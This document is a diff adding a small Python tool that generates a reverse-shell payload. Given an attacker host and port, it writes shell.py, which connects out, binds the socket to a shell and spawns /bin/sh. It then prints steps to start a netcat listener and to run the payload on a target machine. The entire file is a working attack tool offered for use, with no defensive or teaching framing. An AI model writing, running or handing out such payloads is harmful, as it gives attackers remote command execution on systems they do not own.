@@ -1,0 +1,29 @@
+#!/bin/python3
+#this file is for creating python reverse shell paylaod
+import sys
+import base64
+import argparse
+import os
+import time
+
+
+parser = argparse.ArgumentParser(description='Python Payload Creator')
+parser.add_argument('-l',help='rev shell lhost')
+parser.add_argument('-p',help='rev shell lport ',type=int)
+args = parser.parse_args()
+
+lhost = args.l
+lport = args.p
+
+python_shell = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'%(lhost,lport)
+
+
+os.system("touch shell.py")
+shell_file = open("shell.py","w")
+shell_file.write(python_shell)
+shell_file.close()
+
+
+print("[+] Reverse Shell payload  Generated")
+print("[+] Start a netcat listener with command: nc -nvlp lport")
+print("[+] inject and execute this script on target machine with command: python3 shell.py , and wait you will get the shell..")
